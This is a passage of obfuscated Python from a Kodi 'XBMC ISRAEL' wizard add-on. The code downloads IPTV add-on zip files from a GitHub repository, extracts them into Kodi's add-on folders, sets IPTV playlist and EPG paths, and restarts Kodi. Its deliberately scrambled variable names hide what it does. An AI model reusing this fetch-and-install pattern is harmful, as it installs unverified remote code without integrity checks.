                    OOO0000O00O00000O .write (OO0OOO0O00OOOO0O0 )#line:5928
                    if not O0OO0OO00OOOOO00O :#line:5930
                        OOOO000OO0OO0O0O0 =OO000O00OO00OOOOO #line:5931
                    if O0O0O00OO00000O00 .iscanceled ():#line:5932
                       O0O0O00OO00000O00 .close ()#line:5933
                       try :#line:5934
                        os .remove (O0O0OO0OOOOOOO000 )#line:5935
                       except :#line:5936
                        pass #line:5937
                       break #line:5938
                    O000OOOOO0OO00O00 =float (OO000O00OO00OOOOO )/OOOO000OO0OO0O0O0 #line:5939
                    O000OOOOO0OO00O00 =round (O000OOOOO0OO00O00 *100 ,2 )#line:5940
                    O00OO000O00O0000O =OO000O00OO00OOOOO /(1024 *1024 )#line:5941
                    OOOO00OO0OOO0000O =OOOO000OO0OO0O0O0 /(1024 *1024 )#line:5942
                    O00000000O000O0O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OO000O00O0000O ,'teal',OOOO00OO0OOO0000O )#line:5943
                    if (time .time ()-OO0OOO0000O0OO000 )>0 :#line:5944
                      O00OOOOOO00000O00 =OO000O00OO00OOOOO /(time .time ()-OO0OOO0000O0OO000 )#line:5945
                      O00OOOOOO00000O00 =O00OOOOOO00000O00 /1024 #line:5946
                    else :#line:5947
                     O00OOOOOO00000O00 =0 #line:5948
                    OO0OO0O00OOO000O0 ='KB'#line:5949
                    if O00OOOOOO00000O00 >=1024 :#line:5950
                       O00OOOOOO00000O00 =O00OOOOOO00000O00 /1024 #line:5951
                       OO0OO0O00OOO000O0 ='MB'#line:5952
                    if O00OOOOOO00000O00 >0 and not O000OOOOO0OO00O00 ==100 :#line:5953
                        O0OOO00OO00000O00 =(OOOO000OO0OO0O0O0 -OO000O00OO00OOOOO )/O00OOOOOO00000O00 #line:5954
                    else :#line:5955
                        O0OOO00OO00000O00 =0 #line:5956
                    OO00O000OOOO0OOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OOOOOO00000O00 ,OO0OO0O00OOO000O0 )#line:5957
                    O0O0O00OO00000O00 .update (int (O000OOOOO0OO00O00 ),"Downloading "+'iptv',O00000000O000O0O0 ,OO00O000OOOO0OOOO )#line:5959
              OO000OOO00OOO00O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5962
              OOO0000O00O00000O .close ()#line:5965
              extract .all (O0O0OO0OOOOOOO000 ,OO000OOO00OOO00O0 ,O0O0O00OO00000O00 )#line:5966
              try :#line:5969
                os .remove (O0O0OO0OOOOOOO000 )#line:5970
              except :#line:5972
                pass #line:5973
              O0O0O00OO00000O00 .close ()#line:5974
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5977
              OOOO00OOOO00O0O00 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5979
              O0000OOO0OOOO0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5980
              OOO00O00OO0O0OO0O =xbmcgui .DialogProgress ()#line:5981
              OOO00O00OO0O0OO0O .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5982
              O0O0OO0OOOOOOO000 =os .path .join (O0000OOO0OOOO0000 ,'isr.zip')#line:5983
              O00OOO0OO00000O0O =urllib2 .Request (OOOO00OOOO00O0O00 )#line:5984
              OO0OO0OOO000OOO0O =urllib2 .urlopen (O00OOO0OO00000O0O )#line:5985
              O0O0O00OO00000O00 =xbmcgui .DialogProgress ()#line:5987
              O0O0O00OO00000O00 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5988
              O0O0O00OO00000O00 .update (0 )#line:5989
              OOO0000O00O00000O =open (O0O0OO0OOOOOOO000 ,'wb')#line:5991
              try :#line:5993
                OOOO000OO0OO0O0O0 =OO0OO0OOO000OOO0O .info ().getheader ('Content-Length').strip ()#line:5994
                O0OO0OO00OOOOO00O =True #line:5995
              except AttributeError :#line:5996
                    O0OO0OO00OOOOO00O =False #line:5997
              if O0OO0OO00OOOOO00O :#line:5999
                    OOOO000OO0OO0O0O0 =int (OOOO000OO0OO0O0O0 )#line:6000
              OO000O00OO00OOOOO =0 #line:6002
              OO0OOO0000O0OO000 =time .time ()#line:6003
              while True :#line:6004
                    OO0OOO0O00OOOO0O0 =OO0OO0OOO000OOO0O .read (8192 )#line:6005
                    if not OO0OOO0O00OOOO0O0 :#line:6006
                        sys .stdout .write ('\n')#line:6007
                        break #line:6008
                    OO000O00OO00OOOOO +=len (OO0OOO0O00OOOO0O0 )#line:6010
                    OOO0000O00O00000O .write (OO0OOO0O00OOOO0O0 )#line:6011
                    if not O0OO0OO00OOOOO00O :#line:6013
                        OOOO000OO0OO0O0O0 =OO000O00OO00OOOOO #line:6014
                    if O0O0O00OO00000O00 .iscanceled ():#line:6015
                       O0O0O00OO00000O00 .close ()#line:6016
                       try :#line:6017
                        os .remove (O0O0OO0OOOOOOO000 )#line:6018
                       except :#line:6019
                        pass #line:6020
                       break #line:6021
                    O000OOOOO0OO00O00 =float (OO000O00OO00OOOOO )/OOOO000OO0OO0O0O0 #line:6022
                    O000OOOOO0OO00O00 =round (O000OOOOO0OO00O00 *100 ,2 )#line:6023
                    O00OO000O00O0000O =OO000O00OO00OOOOO /(1024 *1024 )#line:6024
                    OOOO00OO0OOO0000O =OOOO000OO0OO0O0O0 /(1024 *1024 )#line:6025
                    O00000000O000O0O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OO000O00O0000O ,'teal',OOOO00OO0OOO0000O )#line:6026
                    if (time .time ()-OO0OOO0000O0OO000 )>0 :#line:6027
                      O00OOOOOO00000O00 =OO000O00OO00OOOOO /(time .time ()-OO0OOO0000O0OO000 )#line:6028
                      O00OOOOOO00000O00 =O00OOOOOO00000O00 /1024 #line:6029
                    else :#line:6030
                     O00OOOOOO00000O00 =0 #line:6031
                    OO0OO0O00OOO000O0 ='KB'#line:6032
                    if O00OOOOOO00000O00 >=1024 :#line:6033
                       O00OOOOOO00000O00 =O00OOOOOO00000O00 /1024 #line:6034
                       OO0OO0O00OOO000O0 ='MB'#line:6035
                    if O00OOOOOO00000O00 >0 and not O000OOOOO0OO00O00 ==100 :#line:6036
                        O0OOO00OO00000O00 =(OOOO000OO0OO0O0O0 -OO000O00OO00OOOOO )/O00OOOOOO00000O00 #line:6037
                    else :#line:6038
                        O0OOO00OO00000O00 =0 #line:6039
                    OO00O000OOOO0OOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OOOOOO00000O00 ,OO0OO0O00OOO000O0 )#line:6040
                    O0O0O00OO00000O00 .update (int (O000OOOOO0OO00O00 ),"Downloading "+'iptv',O00000000O000O0O0 ,OO00O000OOOO0OOOO )#line:6042
              OO000OOO00OOO00O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6045
              OOO0000O00O00000O .close ()#line:6048
              extract .all (O0O0OO0OOOOOOO000 ,OO000OOO00OOO00O0 ,O0O0O00OO00000O00 )#line:6049
              try :#line:6050
                os .remove (O0O0OO0OOOOOOO000 )#line:6051
              except :#line:6053
                pass #line:6054
              O0O0O00OO00000O00 .close ()#line:6055
def iptvkodi17_18 ():#line:6056
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:6059
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6060
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6061
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:6065
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6066
              OOO0O00O0OOO0OOO0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:6068
              O0OOOOOO0O0O0O00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6069
              OO0O0OO00OOOO00OO =xbmcgui .DialogProgress ()#line:6070
              OO0O0OO00OOOO00OO .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6071
              OO0O0O0OO00OOO000 =os .path .join (O0OOOOOO0O0O0O00O ,'isr.zip')#line:6072
              O0OO0O0000OO000OO =urllib2 .Request (OOO0O00O0OOO0OOO0 )#line:6073
              O0OO0OOOOO0O0OO00 =urllib2 .urlopen (O0OO0O0000OO000OO )#line:6074
              O0O00O0OOOOOO00O0 =xbmcgui .DialogProgress ()#line:6076
              O0O00O0OOOOOO00O0 .create ("Downloading","Downloading "+'iptv')#line:6077
              O0O00O0OOOOOO00O0 .update (0 )#line:6078
              O00OO0OOOO0000OOO =open (OO0O0O0OO00OOO000 ,'wb')#line:6080
              try :#line:6082
                O0OO0000O00O00OO0 =O0OO0OOOOO0O0OO00 .info ().getheader ('Content-Length').strip ()#line:6083
                O0O0OOO00OOO0OOO0 =True #line:6084
              except AttributeError :#line:6085
                    O0O0OOO00OOO0OOO0 =False #line:6086
              if O0O0OOO00OOO0OOO0 :#line:6088
                    O0OO0000O00O00OO0 =int (O0OO0000O00O00OO0 )#line:6089
              OOO00000O0OO0O00O =0 #line:6091
              O0OO0O00O0O0OOOO0 =time .time ()#line:6092
              while True :#line:6093
                    O00OOO0O00000OO00 =O0OO0OOOOO0O0OO00 .read (8192 )#line:6094
                    if not O00OOO0O00000OO00 :#line:6095
                        sys .stdout .write ('\n')#line:6096
                        break #line:6097
                    OOO00000O0OO0O00O +=len (O00OOO0O00000OO00 )#line:6099
                    O00OO0OOOO0000OOO .write (O00OOO0O00000OO00 )#line:6100
                    if not O0O0OOO00OOO0OOO0 :#line:6102
                        O0OO0000O00O00OO0 =OOO00000O0OO0O00O #line:6103
                    if O0O00O0OOOOOO00O0 .iscanceled ():#line:6104
                       O0O00O0OOOOOO00O0 .close ()#line:6105
                       try :#line:6106
                        os .remove (OO0O0O0OO00OOO000 )#line:6107
                       except :#line:6108
                        pass #line:6109
                       break #line:6110
                    OOO00000OO0OOOO0O =float (OOO00000O0OO0O00O )/O0OO0000O00O00OO0 #line:6111
                    OOO00000OO0OOOO0O =round (OOO00000OO0OOOO0O *100 ,2 )#line:6112
                    O00000O0OOOO00000 =OOO00000O0OO0O00O /(1024 *1024 )#line:6113
                    O00O0O0OO0O0OO0OO =O0OO0000O00O00OO0 /(1024 *1024 )#line:6114
                    O00O00O00OOOO0OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00000O0OOOO00000 ,'teal',O00O0O0OO0O0OO0OO )#line:6115
                    if (time .time ()-O0OO0O00O0O0OOOO0 )>0 :#line:6116
                      O00OOOOOO0O0O000O =OOO00000O0OO0O00O /(time .time ()-O0OO0O00O0O0OOOO0 )#line:6117
                      O00OOOOOO0O0O000O =O00OOOOOO0O0O000O /1024 #line:6118
                    else :#line:6119
                     O00OOOOOO0O0O000O =0 #line:6120
                    O0OOOO000OO0O0OOO ='KB'#line:6121
                    if O00OOOOOO0O0O000O >=1024 :#line:6122
                       O00OOOOOO0O0O000O =O00OOOOOO0O0O000O /1024 #line:6123
                       O0OOOO000OO0O0OOO ='MB'#line:6124
                    if O00OOOOOO0O0O000O >0 and not OOO00000OO0OOOO0O ==100 :#line:6125
                        O000O0OO0OOO00O00 =(O0OO0000O00O00OO0 -OOO00000O0OO0O00O )/O00OOOOOO0O0O000O #line:6126
                    else :#line:6127
                        O000O0OO0OOO00O00 =0 #line:6128
                    OO00OO0O000O0000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OOOOOO0O0O000O ,O0OOOO000OO0O0OOO )#line:6129
                    O0O00O0OOOOOO00O0 .update (int (OOO00000OO0OOOO0O ),"Downloading "+'iptv',O00O00O00OOOO0OO0 ,OO00OO0O000O0000O )#line:6131
              O000O0OO0O0OOOO00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6134
              O00OO0OOOO0000OOO .close ()#line:6137
              extract .all (OO0O0O0OO00OOO000 ,O000O0OO0O0OOOO00 ,O0O00O0OOOOOO00O0 )#line:6138
              wiz .kodi17Fix ()#line:6140
              try :#line:6142
                os .remove (OO0O0O0OO00OOO000 )#line:6143
              except :#line:6145
                pass #line:6146
              O0O00O0OOOOOO00O0 .close ()#line:6147
              xbmc .sleep (5000 )#line:6149
              OO000OO0OOO0O0OO0 ='התקנת לקוח טלוויזיה חיה'#line:6151
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000OO0OOO0O0OO0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6152
              resetkodi ()#line:6153
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6154
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:6155
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6156
              OOO0O00O0OOO0OOO0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:6157
              O0OOOOOO0O0O0O00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6158
              OO0O0OO00OOOO00OO =xbmcgui .DialogProgress ()#line:6159
              OO0O0OO00OOOO00OO .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6160
              OO0O0O0OO00OOO000 =os .path .join (O0OOOOOO0O0O0O00O ,'isr.zip')#line:6161
              O0OO0O0000OO000OO =urllib2 .Request (OOO0O00O0OOO0OOO0 )#line:6162
              O0OO0OOOOO0O0OO00 =urllib2 .urlopen (O0OO0O0000OO000OO )#line:6163
              O0O00O0OOOOOO00O0 =xbmcgui .DialogProgress ()#line:6165
              O0O00O0OOOOOO00O0 .create ("Downloading","Downloading "+'iptv')#line:6166
              O0O00O0OOOOOO00O0 .update (0 )#line:6167
              O00OO0OOOO0000OOO =open (OO0O0O0OO00OOO000 ,'wb')#line:6169
              try :#line:6171
                O0OO0000O00O00OO0 =O0OO0OOOOO0O0OO00 .info ().getheader ('Content-Length').strip ()#line:6172
                O0O0OOO00OOO0OOO0 =True #line:6173
              except AttributeError :#line:6174
                    O0O0OOO00OOO0OOO0 =False #line:6175
              if O0O0OOO00OOO0OOO0 :#line:6177
                    O0OO0000O00O00OO0 =int (O0OO0000O00O00OO0 )#line:6178
              OOO00000O0OO0O00O =0 #line:6180
              O0OO0O00O0O0OOOO0 =time .time ()#line:6181
              while True :#line:6182
                    O00OOO0O00000OO00 =O0OO0OOOOO0O0OO00 .read (8192 )#line:6183
                    if not O00OOO0O00000OO00 :#line:6184
                        sys .stdout .write ('\n')#line:6185
                        break #line:6186
                    OOO00000O0OO0O00O +=len (O00OOO0O00000OO00 )#line:6188
                    O00OO0OOOO0000OOO .write (O00OOO0O00000OO00 )#line:6189
                    if not O0O0OOO00OOO0OOO0 :#line:6191
                        O0OO0000O00O00OO0 =OOO00000O0OO0O00O #line:6192
                    if O0O00O0OOOOOO00O0 .iscanceled ():#line:6193
                       O0O00O0OOOOOO00O0 .close ()#line:6194
                       try :#line:6195
                        os .remove (OO0O0O0OO00OOO000 )#line:6196
                       except :#line:6197
                        pass #line:6198
                       break #line:6199
                    OOO00000OO0OOOO0O =float (OOO00000O0OO0O00O )/O0OO0000O00O00OO0 #line:6200
                    OOO00000OO0OOOO0O =round (OOO00000OO0OOOO0O *100 ,2 )#line:6201
                    O00000O0OOOO00000 =OOO00000O0OO0O00O /(1024 *1024 )#line:6202
                    O00O0O0OO0O0OO0OO =O0OO0000O00O00OO0 /(1024 *1024 )#line:6203
                    O00O00O00OOOO0OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00000O0OOOO00000 ,'teal',O00O0O0OO0O0OO0OO )#line:6204
                    if (time .time ()-O0OO0O00O0O0OOOO0 )>0 :#line:6205
                      O00OOOOOO0O0O000O =OOO00000O0OO0O00O /(time .time ()-O0OO0O00O0O0OOOO0 )#line:6206
                      O00OOOOOO0O0O000O =O00OOOOOO0O0O000O /1024 #line:6207
                    else :#line:6208
                     O00OOOOOO0O0O000O =0 #line:6209
                    O0OOOO000OO0O0OOO ='KB'#line:6210
                    if O00OOOOOO0O0O000O >=1024 :#line:6211
                       O00OOOOOO0O0O000O =O00OOOOOO0O0O000O /1024 #line:6212
                       O0OOOO000OO0O0OOO ='MB'#line:6213
                    if O00OOOOOO0O0O000O >0 and not OOO00000OO0OOOO0O ==100 :#line:6214
                        O000O0OO0OOO00O00 =(O0OO0000O00O00OO0 -OOO00000O0OO0O00O )/O00OOOOOO0O0O000O #line:6215
                    else :#line:6216
                        O000O0OO0OOO00O00 =0 #line:6217
                    OO00OO0O000O0000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OOOOOO0O0O000O ,O0OOOO000OO0O0OOO )#line:6218
                    O0O00O0OOOOOO00O0 .update (int (OOO00000OO0OOOO0O ),"Downloading "+'iptv',O00O00O00OOOO0OO0 ,OO00OO0O000O0000O )#line:6220
              O000O0OO0O0OOOO00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6223
              O00OO0OOOO0000OOO .close ()#line:6226
              extract .all (OO0O0O0OO00OOO000 ,O000O0OO0O0OOOO00 ,O0O00O0OOOOOO00O0 )#line:6227
              wiz .kodi17Fix ()#line:6228
              try :#line:6230
                os .remove (OO0O0O0OO00OOO000 )#line:6231
              except :#line:6233
                pass #line:6234
              O0O00O0OOOOOO00O0 .close ()#line:6235
              xbmc .sleep (5000 )#line:6237
              OO000OO0OOO0O0OO0 ='התקנת לקוח טלוויזיה חיה'#line:6239
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000OO0OOO0O0OO0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6240
              resetkodi ()#line:6241
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6243
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:6244
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6245
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6246
def iptvidanplus ():#line:6247
    OOOO0OOO000OOO00O =xbmcaddon .Addon ('plugin.video.idanplus')#line:6248
    OOOO0OOO000OOO00O .setSetting ('useIPTV','true')#line:6249
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.idanplus/?mode=7)")#line:6250
    if KODIV >=17 and KODIV <18 :#line:6253
        OO0OOOO000O00O00O ='https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'#line:6255
        OOOO0OOO0OO0O0O0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6256
        O0OOOO00O00OOO0O0 =xbmcgui .DialogProgress ()#line:6257
        O0OOOO00O00OOO0O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6258
        OO000O0OO00000O0O =os .path .join (PACKAGES ,'isr.zip')#line:6259
        O0O000O0OO0000O00 =urllib2 .Request (OO0OOOO000O00O00O )#line:6260
        OOOO00000000000O0 =urllib2 .urlopen (O0O000O0OO0000O00 )#line:6261
        O0OO0O0O000000O00 =xbmcgui .DialogProgress ()#line:6263
        O0OO0O0O000000O00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6264
        O0OO0O0O000000O00 .update (0 )#line:6265
        OOOO0O00O0OO00OOO =open (OO000O0OO00000O0O ,'wb')#line:6267
        try :#line:6269
          O000000000OOOO000 =OOOO00000000000O0 .info ().getheader ('Content-Length').strip ()#line:6270
          OOO0O00O00O0OOO00 =True #line:6271
        except AttributeError :#line:6272
              OOO0O00O00O0OOO00 =False #line:6273
        if OOO0O00O00O0OOO00 :#line:6275
              O000000000OOOO000 =int (O000000000OOOO000 )#line:6276
        OO00OO00O000O00O0 =0 #line:6278
        OOO00O0OO0000000O =time .time ()#line:6279
        while True :#line:6280
              OOOO000O000OO00OO =OOOO00000000000O0 .read (8192 )#line:6281
              if not OOOO000O000OO00OO :#line:6282
                  sys .stdout .write ('\n')#line:6283
                  break #line:6284
              OO00OO00O000O00O0 +=len (OOOO000O000OO00OO )#line:6286
              OOOO0O00O0OO00OOO .write (OOOO000O000OO00OO )#line:6287
              if not OOO0O00O00O0OOO00 :#line:6289
                  O000000000OOOO000 =OO00OO00O000O00O0 #line:6290
              if O0OO0O0O000000O00 .iscanceled ():#line:6291
                 O0OO0O0O000000O00 .close ()#line:6292
                 try :#line:6293
                  os .remove (OO000O0OO00000O0O )#line:6294
                 except :#line:6295
                  pass #line:6296
                 break #line:6297
              OOO0O0O0O00O000OO =float (OO00OO00O000O00O0 )/O000000000OOOO000 #line:6298
              OOO0O0O0O00O000OO =round (OOO0O0O0O00O000OO *100 ,2 )#line:6299
              OO00OO0O00O0O0000 =OO00OO00O000O00O0 /(1024 *1024 )#line:6300
              O000O0OO00000000O =O000000000OOOO000 /(1024 *1024 )#line:6301
              OO00O000000000OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00OO0O00O0O0000 ,'teal',O000O0OO00000000O )#line:6302
              if (time .time ()-OOO00O0OO0000000O )>0 :#line:6303
                O00O0OO00O000OO0O =OO00OO00O000O00O0 /(time .time ()-OOO00O0OO0000000O )#line:6304
                O00O0OO00O000OO0O =O00O0OO00O000OO0O /1024 #line:6305
              else :#line:6306
               O00O0OO00O000OO0O =0 #line:6307
              O00O0OOOOO00O0OO0 ='KB'#line:6308
              if O00O0OO00O000OO0O >=1024 :#line:6309
                 O00O0OO00O000OO0O =O00O0OO00O000OO0O /1024 #line:6310
                 O00O0OOOOO00O0OO0 ='MB'#line:6311
              if O00O0OO00O000OO0O >0 and not OOO0O0O0O00O000OO ==100 :#line:6312
                  OOO0O0O000OO00OO0 =(O000000000OOOO000 -OO00OO00O000O00O0 )/O00O0OO00O000OO0O #line:6313
              else :#line:6314
                  OOO0O0O000OO00OO0 =0 #line:6315
              OOOO0O00O0O00O0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O0OO00O000OO0O ,O00O0OOOOO00O0OO0 )#line:6316
              O0OO0O0O000000O00 .update (int (OOO0O0O0O00O000OO ),OO00O000000000OOO ,OOOO0O00O0O00O0O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6318
        O00OO0000000OOO0O =xbmc .translatePath (os .path .join ('special://home/'))#line:6321
        OOOO0O00O0OO00OOO .close ()#line:6324
        extract .all (OO000O0OO00000O0O ,O00OO0000000OOO0O ,O0OO0O0O000000O00 )#line:6325
        try :#line:6329
          os .remove (OO000O0OO00000O0O )#line:6330
        except :#line:6331
          pass #line:6332
        wiz .kodi17Fix ()#line:6333
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6334
        time .sleep (10 )#line:6335
        O00000OOO0OO00000 =xbmcaddon .Addon ('pvr.iptvsimple')#line:6336
        O00000OOO0OO00000 .setSetting ('epgTimeShift','1.000000')#line:6337
        O00000OOO0OO00000 .setSetting ('m3uPathType','0')#line:6338
        O00000OOO0OO00000 .setSetting ('epgPathType','0')#line:6339
        O00000OOO0OO00000 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6340
        O00000OOO0OO00000 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')#line:6341
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]'%COLOR2 )#line:6342
        resetkodi ()#line:6343
    if KODIV >=18 :#line:6346
        iptvkodi18idan ()#line:6348
        wiz .kodi17Fix ()#line:6349
        time .sleep (10 )#line:6351
        O00000OOO0OO00000 =xbmcaddon .Addon ('pvr.iptvsimple')#line:6352
        O00000OOO0OO00000 .setSetting ('epgTimeShift','1.000000')#line:6353
        O00000OOO0OO00000 .setSetting ('m3uPathType','0')#line:6354
        O00000OOO0OO00000 .setSetting ('epgPathType','0')#line:6355
        O00000OOO0OO00000 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6356
        O00000OOO0OO00000 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')#line:6357
        O0000OOOO000OO0OO ='הגדרת ערוצי עידן פלוס'#line:6358
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000OOOO000OO0OO ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6359
        resetkodi ()#line:6360
def iptvsimpldown ():#line:6376
    O00O00O0OO0OOO0OO =(IPTV18 )#line:6378
    O00000O0OOO0OOOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6379
    OO0OO0OOO000O0OOO =xbmcgui .DialogProgress ()#line:6380
    OO0OO0OOO000O0OOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6381
    O0O0000OOOOO00O0O =os .path .join (PACKAGES ,'isr.zip')#line:6382
    OO00OO00O00OOO0O0 =urllib2 .Request (O00O00O0OO0OOO0OO )#line:6383
    O000OOO0OOO0OO000 =urllib2 .urlopen (OO00OO00O00OOO0O0 )#line:6384
    OOOO0000000000000 =xbmcgui .DialogProgress ()#line:6386
    OOOO0000000000000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6387
    OOOO0000000000000 .update (0 )#line:6388
    O00OOOOO0O0OO00OO =open (O0O0000OOOOO00O0O ,'wb')#line:6390
    try :#line:6392
      O0OO00OOOO00O00OO =O000OOO0OOO0OO000 .info ().getheader ('Content-Length').strip ()#line:6393
      O0O0OOO0000O0000O =True #line:6394
    except AttributeError :#line:6395
          O0O0OOO0000O0000O =False #line:6396
    if O0O0OOO0000O0000O :#line:6398
          O0OO00OOOO00O00OO =int (O0OO00OOOO00O00OO )#line:6399
    OOOO0OO000O0000O0 =0 #line:6401
    O000O00000O0O0OOO =time .time ()#line:6402
    while True :#line:6403
          OOOOOO000OO00O000 =O000OOO0OOO0OO000 .read (8192 )#line:6404
          if not OOOOOO000OO00O000 :#line:6405
              sys .stdout .write ('\n')#line:6406
              break #line:6407
          OOOO0OO000O0000O0 +=len (OOOOOO000OO00O000 )#line:6409
          O00OOOOO0O0OO00OO .write (OOOOOO000OO00O000 )#line:6410
          if not O0O0OOO0000O0000O :#line:6412
              O0OO00OOOO00O00OO =OOOO0OO000O0000O0 #line:6413
          if OOOO0000000000000 .iscanceled ():#line:6414
             OOOO0000000000000 .close ()#line:6415
             try :#line:6416
              os .remove (O0O0000OOOOO00O0O )#line:6417
             except :#line:6418
              pass #line:6419
             break #line:6420
          OOOOOOOOO0000O0O0 =float (OOOO0OO000O0000O0 )/O0OO00OOOO00O00OO #line:6421
          OOOOOOOOO0000O0O0 =round (OOOOOOOOO0000O0O0 *100 ,2 )#line:6422
          O00O00O00O0OOO0O0 =OOOO0OO000O0000O0 /(1024 *1024 )#line:6423
          OOO000OOO0OO0OO00 =O0OO00OOOO00O00OO /(1024 *1024 )#line:6424
          OOO000000OOOO00O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00O00O00O0OOO0O0 ,'teal',OOO000OOO0OO0OO00 )#line:6425
          if (time .time ()-O000O00000O0O0OOO )>0 :#line:6426
            O000OO0OOO0O00OO0 =OOOO0OO000O0000O0 /(time .time ()-O000O00000O0O0OOO )#line:6427
            O000OO0OOO0O00OO0 =O000OO0OOO0O00OO0 /1024 #line:6428
          else :#line:6429
           O000OO0OOO0O00OO0 =0 #line:6430
          OOOOOOOO0O00OO0O0 ='KB'#line:6431
          if O000OO0OOO0O00OO0 >=1024 :#line:6432
             O000OO0OOO0O00OO0 =O000OO0OOO0O00OO0 /1024 #line:6433
             OOOOOOOO0O00OO0O0 ='MB'#line:6434
          if O000OO0OOO0O00OO0 >0 and not OOOOOOOOO0000O0O0 ==100 :#line:6435
              OOOO0OO0O00000OO0 =(O0OO00OOOO00O00OO -OOOO0OO000O0000O0 )/O000OO0OOO0O00OO0 #line:6436
          else :#line:6437
              OOOO0OO0O00000OO0 =0 #line:6438
          O0O0000O00OOOO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O000OO0OOO0O00OO0 ,OOOOOOOO0O00OO0O0 )#line:6439
